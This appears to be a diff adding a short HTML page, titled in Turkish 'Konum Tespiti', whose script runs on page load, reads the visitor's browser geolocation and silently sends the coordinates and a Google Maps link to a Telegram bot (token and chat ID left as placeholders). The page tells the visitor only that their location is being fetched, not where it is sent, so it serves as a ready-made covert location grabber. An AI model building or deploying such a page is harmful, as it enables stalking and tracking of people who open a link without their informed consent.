@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Konum Tespiti</title>
+  </head>
+  <body>
+    <h3>Konum alınıyor...</h3>
+    <script>
+      function sendLocation(lat, lon) {
+        fetch("https://api.telegram.org/bot<BOT_TOKEN>/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: "<CHAT_ID>",
+            text: `📍 Konum alındı:\n\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`
+          })
+        });
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendLocation(lat, lon);
+          },
+          function (error) {
+            alert("Konum alınamadı: " + error.message);
+          }
+        );
+      } else {
+        alert("Tarayıcınız konum desteği vermiyor.");
+      }
+    </script>
+  </body>
+</html>
